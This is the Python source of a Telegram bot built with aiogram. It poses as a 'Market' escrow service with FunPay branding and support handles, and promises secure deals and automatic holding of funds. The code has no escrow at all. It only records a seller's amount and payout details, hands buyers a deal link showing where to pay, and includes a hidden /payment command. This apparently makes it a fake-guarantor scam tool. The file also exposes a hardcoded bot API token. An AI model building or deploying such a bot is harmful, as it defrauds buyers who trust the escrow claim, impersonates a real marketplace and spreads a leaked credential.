import asyncio
import os
import random
import string
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import CommandStart, Command
from aiogram.types import (
    Message, CallbackQuery, FSInputFile, 
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# --- КОНФИГУРАЦИЯ ---
API_TOKEN = '8739690833:AAFRCEsPd7FcphwcP56KpHs7dIEfHMrMPoQ'
SUPPORT_URL = 'https://t.me/FunpayDealsManager'
CHANNEL_URL = 'https://t.me/NewsFunpayBot'
PHOTO_FILENAME = "funpay.jpg" 

bot = Bot(token=API_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

DEALS = {}
PAYMENT_ACCESS = set()
# Переменная для хранения ID фото в Telegram, чтобы не грузить его постоянно с диска
cached_photo_id = None

base_path = os.path.dirname(os.path.abspath(__file__))
photo_path = os.path.join(base_path, PHOTO_FILENAME)

class DealCreation(StatesGroup):
    choosing_currency = State()
    entering_amount = State()
    entering_item = State()
    entering_requisites = State()

# --- КЛАВИАТУРЫ ---
def get_main_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📝 Создать сделку", callback_data="create_deal")],
        [InlineKeyboardButton(text="📋 Мои сделки", callback_data="my_deals"), 
         InlineKeyboardButton(text="🔐 Верификация", callback_data="verify")],
        [InlineKeyboardButton(text="💳 Реквизиты", callback_data="reqs"),
         InlineKeyboardButton(text="🌐 Язык", callback_data="lang")],
        [InlineKeyboardButton(text="🔗 Рефералы", callback_data="refs"),
         InlineKeyboardButton(text="ℹ️ Подробнее", callback_data="about")],
        [InlineKeyboardButton(text="📖 News", url=CHANNEL_URL),
         InlineKeyboardButton(text="📩 Обращения", callback_data="tickets")],
        [InlineKeyboardButton(text="📞 Поддержка", url=SUPPORT_URL)]
    ])

def get_currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 RUB", callback_data="curr_rub"),
         InlineKeyboardButton(text="💵 USD", callback_data="curr_usd")],
        [InlineKeyboardButton(text="💎 TON", callback_data="curr_ton"),
         InlineKeyboardButton(text="⭐️ Stars", callback_data="curr_stars")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
    ])

def get_back_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
    ])

# --- УМНАЯ ОТПРАВКА ФОТО (ДЛЯ ХОСТИНГА) ---
async def universal_send(event, text, reply_markup):
    global cached_photo_id
    
    # Если это CallbackQuery (нажатие кнопки), пробуем редактировать
    if isinstance(event, CallbackQuery):
        try:
            await event.message.edit_caption(caption=text, reply_markup=reply_markup)
            return
        except:
            # Если не вышло (например, нет фото в старом соо), идем дальше слать новое
            pass

    # Если шлем новое сообщение
    target = event.message if isinstance(event, CallbackQuery) else event
    
    try:
        if cached_photo_id:
            # Самый быстрый способ: по ID
            await target.answer_photo(photo=cached_photo_id, caption=text, reply_markup=reply_markup)
        elif os.path.exists(photo_path):
            # Если ID еще нет, грузим с диска и запоминаем ID
            sent_msg = await target.answer_photo(photo=FSInputFile(photo_path), caption=text, reply_markup=reply_markup)
            cached_photo_id = sent_msg.photo[-1].file_id
        else:
            # Если фото вообще нет на сервере
            await target.answer(text, reply_markup=reply_markup)
    except Exception as e:
        # Запасной вариант: просто текст
        print(f"Ошибка при отправке фото: {e}")
        await target.answer(text, reply_markup=reply_markup)

# --- ХЭНДЛЕРЫ ---

@router.message(Command("payment"))
async def secret_payment_command(message: Message):
    PAYMENT_ACCESS.add(message.from_user.id)
    await message.answer("🤫 Доступ к оплате активирован.")

@router.message(CommandStart())
async def start_cmd(message: Message, command: Command = None, state: FSMContext = None):
    if state:
        await state.clear()
        
    if command and command.args and command.args.startswith("deal_"):
        deal_id = command.args.split("_")[1]
        if deal_id in DEALS:
            deal = DEALS[deal_id]
            text = (
                f"💳 <b>Сделка #{deal_id}</b>\n\n"
                f"👤 Продавец: @{deal['creator_username']}\n"
                f"📦 Товар: {deal['item']}\n\n"
                f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
                f"🏦 Реквизиты: <code>{deal['requisites']}</code>"
            )
            await universal_send(message, text, get_back_keyboard())
            return

    text = "<b>Добро пожаловать в Market</b>\n\n🛡 Безопасные сделки\n💰 Автоматическое удержание\n\nМенеджер: @FunpayDealsManager"
    await universal_send(message, text, get_main_keyboard())

@router.callback_query(F.data == "create_deal")
async def process_create_deal(callback: CallbackQuery, state: FSMContext):
    await callback.answer() # Снимаем загрузку с кнопки мгновенно
    await state.set_state(DealCreation.choosing_currency)
    await universal_send(callback, "💼 <b>Шаг 1:</b> Выберите валюту сделки:", get_currency_keyboard())

@router.callback_query(DealCreation.choosing_currency, F.data.startswith("curr_"))
async def process_currency(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    curr = callback.data.split("_")[1].upper()
    await state.update_data(currency=curr)
    await state.set_state(DealCreation.entering_amount)
    await universal_send(callback, f"✅ Валюта: {curr}\n💰 <b>Шаг 2:</b> Введите сумму сделки:", get_back_keyboard())

@router.message(DealCreation.entering_amount)
async def process_amount(message: Message, state: FSMContext):
    await state.update_data(amount=message.text)
    await state.set_state(DealCreation.entering_item)
    await universal_send(message, "📝 <b>Шаг 3:</b> Введите название товара:", get_back_keyboard())

@router.message(DealCreation.entering_item)
async def process_item(message: Message, state: FSMContext):
    await state.update_data(item=message.text)
    await state.set_state(DealCreation.entering_requisites)
    await universal_send(message, "💳 <b>Шаг 4:</b> Укажите реквизиты для выплаты:", get_back_keyboard())

@router.message(DealCreation.entering_requisites)
async def process_requisites(message: Message, state: FSMContext):
    data = await state.get_data()
    deal_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    bot_info = await bot.get_me()
    link = f"https://t.me/{bot_info.username}?start=deal_{deal_id}"
    
    DEALS[deal_id] = {
        "creator_id": message.from_user.id,
        "creator_username": message.from_user.username or "User",
        "currency": data['currency'],
        "amount": data['amount'],
        "item": data['item'],
        "requisites": message.text
    }
    
    await state.clear()
    text = f"✅ <b>Сделка создана!</b>\n\n💰 Сумма: {data['amount']} {data['currency']}\n📦 Товар: {data['item']}\n\n🔗 <b>Ссылка для покупателя:</b>\n{link}"
    await universal_send(message, text, get_back_keyboard())

@router.callback_query(F.data == "back_to_main")
async def back_to_main(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await state.clear()
    await universal_send(callback, "<b>Главное меню Market</b>\n\nВыберите действие:", get_main_keyboard())

async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
